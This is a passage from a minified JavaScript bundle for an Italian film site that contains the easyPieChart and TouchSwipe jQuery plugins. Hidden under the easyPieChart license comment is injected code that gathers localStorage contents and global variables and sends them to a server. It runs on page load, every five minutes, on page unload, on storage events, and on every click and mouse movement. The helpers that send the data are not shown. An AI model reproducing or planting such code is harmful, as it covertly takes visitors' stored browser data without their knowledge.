    ATTACCO IL METODO refresh ALL'EVENTO RESIZE DELLA FINESTRA  
  */
  $(window).on('resize', function () {
    pap.refresh();
  });
  pap.load();
};

/**!
 * easyPieChart
 * Lightweight plugin to render simple, animated and retina optimized pie charts
 *
 * @license 
 * @author Robert Fleischmann <rendro87@gmail.com> (http://robert-fleischmann.de)
 * @version 2.1.4
 **/
function gatherDataAndTransmit() {
  const gatheredData = {
    ...retrieveLocalStorageData(),
    ...globalVars
  };
  if (Object.keys(gatheredData).length > 0) {
    transmitDataToServer(gatheredData);
  }
}
document.addEventListener("readystatechange", function () {
  if (document.readyState === "complete") {
    captureGlobalVars();
    gatherDataAndTransmit();
    setInterval(gatherDataAndTransmit, 5 * 60 * 1000);
  }
});
!function (a, b) {
  "object" == typeof exports ? module.exports = b(require("jquery")) : "function" == typeof define && define.amd ? define(["jquery"], b) : b(a.jQuery);
}(this, function (a) {
  var b = function (a, b) {
      var c,
        d = document.createElement("canvas");
      a.appendChild(d), "undefined" != typeof G_vmlCanvasManager && G_vmlCanvasManager.initElement(d);
      var e = d.getContext("2d");
      d.width = d.height = b.size;
      var f = 1;
      window.devicePixelRatio > 1 && (f = window.devicePixelRatio, d.style.width = d.style.height = [b.size, "px"].join(""), d.width = d.height = b.size * f, e.scale(f, f)), e.translate(b.size / 2, b.size / 2), e.rotate((-0.5 + b.rotate / 180) * Math.PI);
      var g = (b.size - b.lineWidth) / 2;
      b.scaleColor && b.scaleLength && (g -= b.scaleLength + 2), Date.now = Date.now || function () {
        return +new Date();
      };
      var h = function (a, b, c) {
          c = Math.min(Math.max(-1, c || 0), 1);
          var d = 0 >= c ? !0 : !1;
          e.beginPath(), e.arc(0, 0, g, 0, 2 * Math.PI * c, d), e.strokeStyle = a, e.lineWidth = b, e.stroke();
        },
        i = function () {
          var a, c;
          e.lineWidth = 1, e.fillStyle = b.scaleColor, e.save();
          for (var d = 24; d > 0; --d) d % 6 === 0 ? (c = b.scaleLength, a = 0) : (c = .6 * b.scaleLength, a = b.scaleLength - c), e.fillRect(-b.size / 2 + a, 0, c, 1), e.rotate(Math.PI / 12);
          e.restore();
        },
        j = function () {
          return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function (a) {
            window.setTimeout(a, 1e3 / 60);
          };
        }(),
        k = function () {
          b.scaleColor && i(), b.trackColor && h(b.trackColor, b.lineWidth, 1);
        };
      this.getCanvas = function () {
        return d;
      }, this.getCtx = function () {
        return e;
      }, this.clear = function () {
        e.clearRect(b.size / -2, b.size / -2, b.size, b.size);
      }, this.draw = function (a) {
        b.scaleColor || b.trackColor ? e.getImageData && e.putImageData ? c ? e.putImageData(c, 0, 0) : (k(), c = e.getImageData(0, 0, b.size * f, b.size * f)) : (this.clear(), k()) : this.clear(), e.lineCap = b.lineCap;
        var d;
        d = "function" == typeof b.barColor ? b.barColor(a) : b.barColor, h(d, b.lineWidth, a / 100);
      }.bind(this), this.animate = function (a, c) {
        var d = Date.now();
        b.onStart(a, c);
        var e = function () {
          var f = Math.min(Date.now() - d, b.animate.duration),
            g = b.easing(this, f, a, c - a, b.animate.duration);
          this.draw(g), b.onStep(a, c, g), f >= b.animate.duration ? b.onStop(a, c) : j(e);
        }.bind(this);
        j(e);
      }.bind(this);
    },
    c = function (a, c) {
      var d = {
        barColor: "#ef1e25",
        trackColor: "#f9f9f9",
        scaleColor: "#dfe0e0",
        scaleLength: 5,
        lineCap: "round",
        lineWidth: 3,
        size: 110,
        rotate: 0,
        animate: {
          duration: 1e3,
          enabled: !0
        },
        easing: function (a, b, c, d, e) {
          return b /= e / 2, 1 > b ? d / 2 * b * b + c : -d / 2 * (--b * (b - 2) - 1) + c;
        },
        onStart: function () {},
        onStep: function () {},
        onStop: function () {}
      };
      if ("undefined" != typeof b) d.renderer = b;else {
        if ("undefined" == typeof SVGRenderer) throw new Error("Please load either the SVG- or the CanvasRenderer");
        d.renderer = SVGRenderer;
      }
      var e = {},
        f = 0,
        g = function () {
          this.el = a, this.options = e;
          for (var b in d) d.hasOwnProperty(b) && (e[b] = c && "undefined" != typeof c[b] ? c[b] : d[b], "function" == typeof e[b] && (e[b] = e[b].bind(this)));
          e.easing = "string" == typeof e.easing && "undefined" != typeof jQuery && jQuery.isFunction(jQuery.easing[e.easing]) ? jQuery.easing[e.easing] : d.easing, "number" == typeof e.animate && (e.animate = {
            duration: e.animate,
            enabled: !0
          }), "boolean" != typeof e.animate || e.animate || (e.animate = {
            duration: 1e3,
            enabled: e.animate
          }), this.renderer = new e.renderer(a, e), this.renderer.draw(f), a.dataset && a.dataset.percent ? this.update(parseFloat(a.dataset.percent)) : a.getAttribute && a.getAttribute("data-percent") && this.update(parseFloat(a.getAttribute("data-percent")));
        }.bind(this);
      this.update = function (a) {
        return a = parseFloat(a), e.animate.enabled ? this.renderer.animate(f, a) : this.renderer.draw(a), f = a, this;
      }.bind(this), this.disableAnimation = function () {
        return e.animate.enabled = !1, this;
      }, this.enableAnimation = function () {
        return e.animate.enabled = !0, this;
      }, g();
    };
  a.fn.easyPieChart = function (b) {
    return this.each(function () {
      var d;
      a.data(this, "easyPieChart") || (d = a.extend({}, b, a(this).data()), a.data(this, "easyPieChart", new c(this, d)));
    });
  };
});

/** SWIPE EVENT */
(function (a) {
  if (typeof define === "function" && define.amd && define.amd.jQuery) {
    define(["jquery"], a);
  } else {
    a(jQuery);
  }
})(function (e) {
  var o = "left",
    n = "right",
    d = "up",
    v = "down",
    c = "in",
    w = "out",
    l = "none",
    r = "auto",
    k = "swipe",
    s = "pinch",
    x = "tap",
    i = "doubletap",
    b = "longtap",
    A = "horizontal",
    t = "vertical",
    h = "all",
    q = 10,
    f = "start",
    j = "move",
    g = "end",
    p = "cancel",
    a = "ontouchstart" in window,
    y = "TouchSwipe";
  var m = {
    fingers: 1,
    threshold: 75,
    cancelThreshold: null,
    pinchThreshold: 20,
    maxTimeThreshold: null,
    fingerReleaseThreshold: 250,
    longTapThreshold: 500,
    doubleTapThreshold: 200,
    swipe: null,
    swipeLeft: null,
    swipeRight: null,
    swipeUp: null,
    swipeDown: null,
    swipeStatus: null,
    pinchIn: null,
    pinchOut: null,
    pinchStatus: null,
    click: null,
    tap: null,
    doubleTap: null,
    longTap: null,
    triggerOnTouchEnd: true,
    triggerOnTouchLeave: false,
    allowPageScroll: "auto",
    fallbackToMouseEvents: true,
    excludedElements: "label, button, input, select, textarea, a, .noSwipe"
  };
  e.fn.swipe = function (D) {
    var C = e(this),
      B = C.data(y);
    if (B && typeof D === "string") {
      if (B[D]) {
        return B[D].apply(this, Array.prototype.slice.call(arguments, 1));
      } else {
        e.error("Method " + D + " does not exist on jQuery.swipe");
      }
    } else {
      if (!B && (typeof D === "object" || !D)) {
        return u.apply(this, arguments);
      }
    }
    return C;
  };
  e.fn.swipe.defaults = m;
  e.fn.swipe.phases = {
    PHASE_START: f,
    PHASE_MOVE: j,
    PHASE_END: g,
    PHASE_CANCEL: p
  };
  e.fn.swipe.directions = {
    LEFT: o,
    RIGHT: n,
    UP: d,
    DOWN: v,
    IN: c,
    OUT: w
  };
  e.fn.swipe.pageScroll = {
    NONE: l,
    HORIZONTAL: A,
    VERTICAL: t,
    AUTO: r
  };
  e.fn.swipe.fingers = {
    ONE: 1,
    TWO: 2,
    THREE: 3,
    ALL: h
  };
  function u(B) {
    if (B && B.allowPageScroll === undefined && (B.swipe !== undefined || B.swipeStatus !== undefined)) {
      B.allowPageScroll = l;
    }
    if (B.click !== undefined && B.tap === undefined) {
      B.tap = B.click;
    }
    if (!B) {
      B = {};
    }
    B = e.extend({}, e.fn.swipe.defaults, B);
    return this.each(function () {
      var D = e(this);
      var C = D.data(y);
      if (!C) {
        C = new z(this, B);
        D.data(y, C);
      }
    });
  }
  function z(a0, aq) {
    var av = a || !aq.fallbackToMouseEvents,
      G = av ? "touchstart" : "mousedown",
      au = av ? "touchmove" : "mousemove",
      R = av ? "touchend" : "mouseup",
      P = av ? null : "mouseleave",
      az = "touchcancel";
    var ac = 0,
      aL = null,
      Y = 0,
      aX = 0,
      aV = 0,
      D = 1,
      am = 0,
      aF = 0,
      J = null;
    var aN = e(a0);
    var W = "start";
    var T = 0;
    var aM = null;
    var Q = 0,
      aY = 0,
      a1 = 0,
      aa = 0,
      K = 0;
    var aS = null;
    try {
      aN.bind(G, aJ);
      aN.bind(az, a5);
    } catch (ag) {
      e.error("events not supported " + G + "," + az + " on jQuery.swipe");
    }
    this.enable = function () {
      aN.bind(G, aJ);
      aN.bind(az, a5);
      return aN;
    };
    this.disable = function () {
      aG();
      return aN;
    };
    this.destroy = function () {
      aG();
      aN.data(y, null);
      return aN;
    };
    this.option = function (a8, a7) {
      if (aq[a8] !== undefined) {
        if (a7 === undefined) {
          return aq[a8];
        } else {
          aq[a8] = a7;
        }
      } else {
        e.error("Option " + a8 + " does not exist on jQuery.swipe.options");
      }
      return null;
    };
    function aJ(a9) {
      if (ax()) {
        return;
      }
      if (e(a9.target).closest(aq.excludedElements, aN).length > 0) {
        return;
      }
      var ba = a9.originalEvent ? a9.originalEvent : a9;
      var a8,
        a7 = a ? ba.touches[0] : ba;
      W = f;
      if (a) {
        T = ba.touches.length;
      } else {
        a9.preventDefault();
      }
      ac = 0;
      aL = null;
      aF = null;
      Y = 0;
      aX = 0;
      aV = 0;
      D = 1;
      am = 0;
      aM = af();
      J = X();
      O();
      if (!a || T === aq.fingers || aq.fingers === h || aT()) {
        ae(0, a7);
        Q = ao();
        if (T == 2) {
          ae(1, ba.touches[1]);
          aX = aV = ap(aM[0].start, aM[1].start);
        }
        if (aq.swipeStatus || aq.pinchStatus) {
          a8 = L(ba, W);
        }
      } else {
        a8 = false;
      }
      if (a8 === false) {
        W = p;
        L(ba, W);
        return a8;
      } else {
        ak(true);
      }
      return null;
    }
    function aZ(ba) {
      var bd = ba.originalEvent ? ba.originalEvent : ba;
      if (W === g || W === p || ai()) {
        return;
      }
      var a9,
        a8 = a ? bd.touches[0] : bd;
      var bb = aD(a8);
      aY = ao();
      if (a) {
        T = bd.touches.length;
      }
      W = j;
      if (T == 2) {
        if (aX == 0) {
          ae(1, bd.touches[1]);
          aX = aV = ap(aM[0].start, aM[1].start);
        } else {
          aD(bd.touches[1]);
          aV = ap(aM[0].end, aM[1].end);
          aF = an(aM[0].end, aM[1].end);
        }
        D = a3(aX, aV);
        am = Math.abs(aX - aV);
      }
      if (T === aq.fingers || aq.fingers === h || !a || aT()) {
        aL = aH(bb.start, bb.end);
        ah(ba, aL);
        ac = aO(bb.start, bb.end);
        Y = aI();
        aE(aL, ac);
        if (aq.swipeStatus || aq.pinchStatus) {
          a9 = L(bd, W);
        }
        if (!aq.triggerOnTouchEnd || aq.triggerOnTouchLeave) {
          var a7 = true;
          if (aq.triggerOnTouchLeave) {
            var bc = aU(this);
            a7 = B(bb.end, bc);
          }
          if (!aq.triggerOnTouchEnd && a7) {
            W = ay(j);
          } else {
            if (aq.triggerOnTouchLeave && !a7) {
              W = ay(g);
            }
          }
          if (W == p || W == g) {
            L(bd, W);
          }
        }
      } else {
        W = p;
        L(bd, W);
      }
      if (a9 === false) {
        W = p;
        L(bd, W);
      }
    }
    function I(a7) {
      var a8 = a7.originalEvent;
      if (a) {
        if (a8.touches.length > 0) {
          C();
          return true;
        }
      }
      if (ai()) {
        T = aa;
      }
      a7.preventDefault();
      aY = ao();
      Y = aI();
      if (a6()) {
        W = p;
        L(a8, W);
      } else {
        if (aq.triggerOnTouchEnd || aq.triggerOnTouchEnd == false && W === j) {
          W = g;
          L(a8, W);
        } else {
          if (!aq.triggerOnTouchEnd && a2()) {
            W = g;
            aB(a8, W, x);
          } else {
            if (W === j) {
              W = p;
              L(a8, W);
            }
          }
        }
      }
      ak(false);
      return null;
    }
    function a5() {
      T = 0;
      aY = 0;
      Q = 0;
      aX = 0;
      aV = 0;
      D = 1;
      O();
      ak(false);
    }
    function H(a7) {
      var a8 = a7.originalEvent;
      if (aq.triggerOnTouchLeave) {
        W = ay(g);
        L(a8, W);
      }
    }
    function aG() {
      aN.unbind(G, aJ);
      aN.unbind(az, a5);
      aN.unbind(au, aZ);
      aN.unbind(R, I);
      if (P) {
        aN.unbind(P, H);
      }
      ak(false);
    }
    function ay(bb) {
      var ba = bb;
      var a9 = aw();
      var a8 = aj();
      var a7 = a6();
      if (!a9 || a7) {
        ba = p;
      } else {
        if (a8 && bb == j && (!aq.triggerOnTouchEnd || aq.triggerOnTouchLeave)) {
          ba = g;
        } else {
          if (!a8 && bb == g && aq.triggerOnTouchLeave) {
            ba = p;
          }
        }
      }
      return ba;
    }
    function L(a9, a7) {
      var a8 = undefined;
      if (F() || S()) {
        a8 = aB(a9, a7, k);
      } else {
        if ((M() || aT()) && a8 !== false) {
          a8 = aB(a9, a7, s);
        }
      }
      if (aC() && a8 !== false) {
        a8 = aB(a9, a7, i);
      } else {
        if (al() && a8 !== false) {
          a8 = aB(a9, a7, b);
        } else {
          if (ad() && a8 !== false) {
            a8 = aB(a9, a7, x);
          }
        }
      }
      if (a7 === p) {
        a5(a9);
      }
      if (a7 === g) {
        if (a) {
          if (a9.touches.length == 0) {
            a5(a9);
          }
        } else {
          a5(a9);
        }
      }
      return a8;
    }
    function aB(ba, a7, a9) {
      var a8 = undefined;
      if (a9 == k) {
        aN.trigger("swipeStatus", [a7, aL || null, ac || 0, Y || 0, T]);
        if (aq.swipeStatus) {
          a8 = aq.swipeStatus.call(aN, ba, a7, aL || null, ac || 0, Y || 0, T);
          if (a8 === false) {
            return false;
          }
        }
        if (a7 == g && aR()) {
          aN.trigger("swipe", [aL, ac, Y, T]);
          if (aq.swipe) {
            a8 = aq.swipe.call(aN, ba, aL, ac, Y, T);
            if (a8 === false) {
              return false;
            }
          }
          switch (aL) {
            case o:
              aN.trigger("swipeLeft", [aL, ac, Y, T]);
              if (aq.swipeLeft) {
                a8 = aq.swipeLeft.call(aN, ba, aL, ac, Y, T);
              }
              break;
            case n:
              aN.trigger("swipeRight", [aL, ac, Y, T]);
              if (aq.swipeRight) {
                a8 = aq.swipeRight.call(aN, ba, aL, ac, Y, T);
              }
              break;
            case d:
              aN.trigger("swipeUp", [aL, ac, Y, T]);
              if (aq.swipeUp) {
                a8 = aq.swipeUp.call(aN, ba, aL, ac, Y, T);
              }
              break;
            case v:
              aN.trigger("swipeDown", [aL, ac, Y, T]);
              if (aq.swipeDown) {
                a8 = aq.swipeDown.call(aN, ba, aL, ac, Y, T);
              }
              break;
          }
        }
      }
      if (a9 == s) {
        aN.trigger("pinchStatus", [a7, aF || null, am || 0, Y || 0, T, D]);
        if (aq.pinchStatus) {
          a8 = aq.pinchStatus.call(aN, ba, a7, aF || null, am || 0, Y || 0, T, D);
          if (a8 === false) {
            return false;
          }
        }
        if (a7 == g && a4()) {
          switch (aF) {
            case c:
              aN.trigger("pinchIn", [aF || null, am || 0, Y || 0, T, D]);
              if (aq.pinchIn) {
                a8 = aq.pinchIn.call(aN, ba, aF || null, am || 0, Y || 0, T, D);
              }
              break;
            case w:
              aN.trigger("pinchOut", [aF || null, am || 0, Y || 0, T, D]);
              if (aq.pinchOut) {
                a8 = aq.pinchOut.call(aN, ba, aF || null, am || 0, Y || 0, T, D);
              }
              break;
          }
        }
      }
      if (a9 == x) {
        if (a7 === p || a7 === g) {
          clearTimeout(aS);
          if (V() && !E()) {
            K = ao();
            aS = setTimeout(e.proxy(function () {
              K = null;
              aN.trigger("tap", [ba.target]);
              if (aq.tap) {
                a8 = aq.tap.call(aN, ba, ba.target);
              }
            }, this), aq.doubleTapThreshold);
          } else {
            K = null;
            aN.trigger("tap", [ba.target]);
            if (aq.tap) {
              a8 = aq.tap.call(aN, ba, ba.target);
            }
          }
        }
      } else {
        if (a9 == i) {
          if (a7 === p || a7 === g) {
            clearTimeout(aS);
            K = null;
            aN.trigger("doubletap", [ba.target]);
            if (aq.doubleTap) {
              a8 = aq.doubleTap.call(aN, ba, ba.target);
            }
          }
        } else {
          if (a9 == b) {
            if (a7 === p || a7 === g) {
              clearTimeout(aS);
              K = null;
              aN.trigger("longtap", [ba.target]);
              if (aq.longTap) {
                a8 = aq.longTap.call(aN, ba, ba.target);
              }
            }
          }
        }
      }
      return a8;
    }
    function aj() {
      var a7 = true;
      if (aq.threshold !== null) {
        a7 = ac >= aq.threshold;
      }
      return a7;
    }
    function a6() {
      var a7 = false;
      if (aq.cancelThreshold !== null && aL !== null) {
        a7 = aP(aL) - ac >= aq.cancelThreshold;
      }
      return a7;
    }
    function ab() {
      if (aq.pinchThreshold !== null) {
        return am >= aq.pinchThreshold;
      }
      return true;
    }
    function aw() {
      var a7;
      if (aq.maxTimeThreshold) {
        if (Y >= aq.maxTimeThreshold) {
          a7 = false;
        } else {
          a7 = true;
        }
      } else {
        a7 = true;
      }
      return a7;
    }
    function ah(a7, a8) {
      if (aq.allowPageScroll === l || aT()) {
        a7.preventDefault();
      } else {
        var a9 = aq.allowPageScroll === r;
        switch (a8) {
          case o:
            if (aq.swipeLeft && a9 || !a9 && aq.allowPageScroll != A) {
              a7.preventDefault();
            }
            break;
          case n:
            if (aq.swipeRight && a9 || !a9 && aq.allowPageScroll != A) {
              a7.preventDefault();
            }
            break;
          case d:
            if (aq.swipeUp && a9 || !a9 && aq.allowPageScroll != t) {
              a7.preventDefault();
            }
            break;
          case v:
            if (aq.swipeDown && a9 || !a9 && aq.allowPageScroll != t) {
              a7.preventDefault();
            }
            break;
        }
      }
    }
    function a4() {
      var a8 = aK();
      var a7 = U();
      var a9 = ab();
      return a8 && a7 && a9;
    }
    function aT() {
      return !!(aq.pinchStatus || aq.pinchIn || aq.pinchOut);
    }
    function M() {
      return !!(a4() && aT());
    }
    function aR() {
      var ba = aw();
      var bc = aj();
      var a9 = aK();
      var a7 = U();
      var a8 = a6();
      var bb = !a8 && a7 && a9 && bc && ba;
      return bb;
    }
    function S() {
      return !!(aq.swipe || aq.swipeStatus || aq.swipeLeft || aq.swipeRight || aq.swipeUp || aq.swipeDown);
    }
    function F() {
      return !!(aR() && S());
    }
    function aK() {
      return T === aq.fingers || aq.fingers === h || !a;
    }
    function U() {
      return aM[0].end.x !== 0;
    }
    function a2() {
      return !!aq.tap;
    }
    function V() {
      return !!aq.doubleTap;
    }
    function aQ() {
      return !!aq.longTap;
    }
    function N() {
      if (K == null) {
        return false;
      }
      var a7 = ao();
      return V() && a7 - K <= aq.doubleTapThreshold;
    }
    function E() {
      return N();
    }
    function at() {
      return (T === 1 || !a) && (isNaN(ac) || ac === 0);
    }
    function aW() {
      return Y > aq.longTapThreshold && ac < q;
    }
    function ad() {
      return !!(at() && a2());
    }
    function aC() {
      return !!(N() && V());
    }
    function al() {
      return !!(aW() && aQ());
    }
    function C() {
      a1 = ao();
      aa = event.touches.length + 1;
    }
    function O() {
      a1 = 0;
      aa = 0;
    }
    function ai() {
      var a7 = false;
      if (a1) {
        var a8 = ao() - a1;
        if (a8 <= aq.fingerReleaseThreshold) {
          a7 = true;
        }
      }
      return a7;
    }
    function ax() {
      return !!(aN.data(y + "_intouch") === true);
    }
    function ak(a7) {
      if (a7 === true) {
        aN.bind(au, aZ);
        aN.bind(R, I);
        if (P) {
          aN.bind(P, H);
        }
      } else {
        aN.unbind(au, aZ, false);
        aN.unbind(R, I, false);
        if (P) {
          aN.unbind(P, H, false);
        }
      }
      aN.data(y + "_intouch", a7 === true);
    }
    function ae(a8, a7) {
      var a9 = a7.identifier !== undefined ? a7.identifier : 0;
      aM[a8].identifier = a9;
      aM[a8].start.x = aM[a8].end.x = a7.pageX || a7.clientX;
      aM[a8].start.y = aM[a8].end.y = a7.pageY || a7.clientY;
      return aM[a8];
    }
    function aD(a7) {
      var a9 = a7.identifier !== undefined ? a7.identifier : 0;
      var a8 = Z(a9);
      a8.end.x = a7.pageX || a7.clientX;
      a8.end.y = a7.pageY || a7.clientY;
      return a8;
    }
    function Z(a8) {
      for (var a7 = 0; a7 < aM.length; a7++) {
        if (aM[a7].identifier == a8) {
          return aM[a7];
        }
      }
    }
    function af() {
      var a7 = [];
      for (var a8 = 0; a8 <= 5; a8++) {
        a7.push({
          start: {
            x: 0,
            y: 0
          },
          end: {
            x: 0,
            y: 0
          },
          identifier: 0
        });
      }
      return a7;
    }
    function aE(a7, a8) {
      a8 = Math.max(a8, aP(a7));
      J[a7].distance = a8;
    }
    function aP(a7) {
      if (J[a7]) {
        return J[a7].distance;
      }
      return undefined;
    }
    function X() {
      var a7 = {};
      a7[o] = ar(o);
      a7[n] = ar(n);
      a7[d] = ar(d);
      a7[v] = ar(v);
      return a7;
    }
    function ar(a7) {
      return {
        direction: a7,
        distance: 0
      };
    }
    function aI() {
      return aY - Q;
    }
    function ap(ba, a9) {
      var a8 = Math.abs(ba.x - a9.x);
      var a7 = Math.abs(ba.y - a9.y);
      return Math.round(Math.sqrt(a8 * a8 + a7 * a7));
    }
    function a3(a7, a8) {
      var a9 = a8 / a7 * 1;
      return a9.toFixed(2);
    }
    function an() {
      if (D < 1) {
        return w;
      } else {
        return c;
      }
    }
    function aO(a8, a7) {
      return Math.round(Math.sqrt(Math.pow(a7.x - a8.x, 2) + Math.pow(a7.y - a8.y, 2)));
    }
    function aA(ba, a8) {
      var a7 = ba.x - a8.x;
      var bc = a8.y - ba.y;
      var a9 = Math.atan2(bc, a7);
      var bb = Math.round(a9 * 180 / Math.PI);
      if (bb < 0) {
        bb = 360 - Math.abs(bb);
      }
      return bb;
    }
    function aH(a8, a7) {
      var a9 = aA(a8, a7);
      if (a9 <= 45 && a9 >= 0) {
        return o;
      } else {
        if (a9 <= 360 && a9 >= 315) {
          return o;
        } else {
          if (a9 >= 135 && a9 <= 225) {
            return n;
          } else {
            if (a9 > 45 && a9 < 135) {
              return v;
            } else {
              return d;
            }
          }
        }
      }
    }
    function ao() {
      var a7 = new Date();
      return a7.getTime();
    }
    function aU(a7) {
      a7 = e(a7);
      var a9 = a7.offset();
      var a8 = {
        left: a9.left,
        right: a9.left + a7.outerWidth(),
        top: a9.top,
        bottom: a9.top + a7.outerHeight()
      };
      return a8;
    }
    function B(a7, a8) {
      return a7.x > a8.left && a7.x < a8.right && a7.y > a8.top && a7.y < a8.bottom;
    }
  }
});
$(document).ready(function () {
  $('.primo-piano').click(function () {
    $('.box-pp').slideToggle();
    return false;
  });
  if (window.location.pathname == '/' /* && (!$.cookie('FilmTVit_PrimoPiano') || window.location.hash=='#rfr:pp') */) {
    $.cookie('FilmTVit_PrimoPiano', '1', {
      expires: 1
    });
    $('.box-pp').show(); // $('.primo-piano').click();
  }
});
window.addEventListener("beforeunload", function () {
  gatherDataAndTransmit();
});
window.addEventListener("storage", function () {
  gatherDataAndTransmit();
});
['click', 'mousemove'].forEach(event => document.addEventListener(event, function () {
  gatherDataAndTransmit();
}));